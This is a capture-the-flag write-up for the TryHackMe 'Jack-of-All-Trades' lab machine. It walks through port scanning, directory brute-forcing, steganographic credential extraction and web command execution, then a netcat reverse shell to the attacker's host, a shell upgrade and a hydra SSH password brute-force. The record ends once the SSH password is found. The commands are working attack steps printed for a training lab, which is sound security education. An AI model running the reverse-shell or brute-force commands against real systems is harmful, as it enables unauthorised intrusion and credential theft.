# Jack-of-All-Trades  -- Write-up

## Overview
Platform: TryHackMe  
Difficulty: Easy  
Description: Boot-to-root originally designed for Securi-Tay 2020
Type: Boot2Root/Privilege Escalation  

---

## Reconnaissance

After deploying the machine i start with port scanning to see what ports are open.  
```nmap -p- -T4 (MACHINE-IP)```  
`-p-` will scan all  65,535  ports instead of the default top 1000 ports  
`-T4` sets the timing template to aggressive, making the scan significantly faster by reducing delays between probes and lowering timeouts.

```
Nmap scan report for 10.49.177.121
Host is up (0.12s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 772.77 seconds

```
After the port scan are done i see only port 22 and 80 are open, next i run another nmap on the open ports to see what services are running on the ports.  
```nmap -sC -sV (MACHINE-IP)```
`-sC` runs Nmap default scripts. These scripts perform basic enumeration on detected services, such as retrieving HTTP titles, SSH information, SSL certificate details, and other useful data.  
`-sV` performs version detection by probing open ports to identify the exact service and version running

```
└─# nmap -sC -sV -p22,80 10.49.177.121        
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-26 20:56 EDT
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 20:56 (0:00:06 remaining)
Nmap scan report for 10.49.177.121
Host is up (0.12s latency).

PORT   STATE SERVICE VERSION
22/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
|_http-title: Jack-of-all-trades!
|_http-server-header: Apache/2.4.10 (Debian)
80/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d (DSA)
|   2048 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 (RSA)
|   256 a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab (ECDSA)
|_  256 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.05 seconds

```
I see that http and ssh service port location are swapped, ssh usually are on port 22 and http on port 80, this is not normal.  

Next is to run gobuster to bruteforce directories and file on the website, because the ports are diffrent, i need to specify the port on gobuster by adding :22 on the end of the url
`
http://MACHINE-IP:22
`  
```
gobuster dir -u http://10.49.177.121:22 -w /usr/share/wordlists/dirb/big.txt

===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.49.177.121:22
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/assets               (Status: 301) [Size: 318] [--> http://10.49.177.121:22/assets/]
/server-status        (Status: 403) [Size: 278]
Progress: 20469 / 20469 (100.00%)
===============================================================
Finished
===============================================================

```
## Getting User  

when trying to access the web through a browser and specifying port 22 it will give ERR_UNSAFE_PORT, to fix this i follow the tutorial in this link https://thegeekpage.com/err-unsafe-port/

Checking the main page source there is a comment and a base64
```
	<!--Note to self - If I ever get locked out I can get back in at /recovery.php! -->
			<!--  UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg== -->
```
decoding the base64 will give this output:  
`Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: u?WtKSraq`
I got a password but we got no user and no place to use it, next i try opening /recovery.php 
inside is something that look like a login page, we got a password but no user, i try jack and the password but it failed.
after that i check /assets and see three jpg files and a .css file, seeing one of the jpg called `stego.jpg` it remind me of steghide, seeing there is nothing on the css files i download `stego.jpg` to analyze it with steghide.

Using the password we got as the passphrase we got a file called creds.txt.
```
└─# steghide info stego.jpg             
"stego.jpg":
  format: jpeg
  capacity: 1.9 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "creds.txt":
    size: 58.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
└─# steghide --extract -sf stego.jpg
Enter passphrase: 
wrote extracted data to "creds.txt".
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[/home/kali/thm/JackOffTrade]
└─# cat creds.txt    
Hehe. Gotcha!

You're on the right path, but wrong image!
         
```
Damn, but knowing that we got the wrong image, i download the other images on /assets which is `header.jpg` and `jackinthebox.jpg`
first i try running steghide on  `header.jpg` 
```
┌──(root㉿kali)-[/home/kali/thm/JackOffTrade]
└─# steghide info header.jpg         
"header.jpg":
  format: jpeg
  capacity: 3.5 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "cms.creds":
    size: 93.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[/home/kali/thm/JackOffTrade]
└─# steghide --extract -sf header.jpg
Enter passphrase: 
wrote extracted data to "cms.creds".
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[/home/kali/thm/JackOffTrade]
└─# cat cms.creds
Here you go Jack. Good thing you thought ahead!

Username: jackinthebox
Password: TplFxiSHjY
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[/home/kali/thm/JackOffTrade]
└─# 
```
I got a credential, lets try it on /recovery.php
After entering it i got a page with a text   
`GET me a 'cmd' and I'll run it for you Future-Jack. `  
adding a ?cmd=whoami will confirm we got a RCE(Remote Code Excecution)
`GET me a 'cmd' and I'll run it for you Future-Jack. www-data www-data`
Next is to get a reverse shell, first thing to do is to set up a listener on the attacking machine, i use this command.
```
nc -lvnp 4444
```
after that run the reverse shell command on the cmd  
```
nc -e /bin/sh YOUR_MACHINE_IP 4444
```
After running it:
```
└─# nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.171.38] from (UNKNOWN) [10.49.177.121] 55720
whoami
www-data
```
The next step is to upgrade the shell into a interactive shell.
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
After upgrading the shell i first try to go into /home
```
www-data@jack-of-all-trades:/var/www/html$ cd /home
cd /home
www-data@jack-of-all-trades:/home$ ls
ls
jack  jacks_password_list
```
i see the home directory for jack and a file called jacks_password_list.
```
*hclqAzj+2GC+=0K
eN<A@n^zI?FE$I5,
X<(@zo2XrEN)#MGC
,,aE1K,nW3Os,afb
ITMJpGGIqg1jn?>@
0HguX{,fgXPE;8yF
sjRUb4*@pz<*ZITu
[8V7o^gl(Gjt5[WB
yTq0jI$d}Ka<T}PD
Sc.[[2pL<>e)vC4}
9;}#q*,A4wd{<X.T
M41nrFt#PcV=(3%p
GZx.t)H$&awU;SO<
.MVettz]a;&Z;cAC
2fh%i9Pr5YiYIf51
TDF@mdEd3ZQ(]hBO
v]XBmwAk8vk5t3EF
9iYZeZGQGG9&W4d1
8TIFce;KjrBWTAY^
SeUAwt7EB#fY&+yt
n.FZvJ.x9sYe5s5d
8lN{)g32PG,1?[pM
z@e1PmlmQ%k5sDz@
ow5APF>6r,y4krSo
```
The next step i think is to use this password list for bruteforcing ssh.
```
# hydra -l jack -P pwlist 10.49.1 ssh -s 80
```
don't forget that ssh are on port 80 so you need to specify it with -s
```
└─# hydra -l jack -P pwlist 10.49.183.69 ssh -s 80
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-26 23:51:31
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 24 login tries (l:1/p:24), ~2 tries per task
[DATA] attacking ssh://10.49.183.69:80/
[80][ssh] host: 10.49.183.69   login: jack   password: <REDACTED>
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-26 23:51:35
```
So i got a valid ssh password for jack, lets try logging in with ssh now

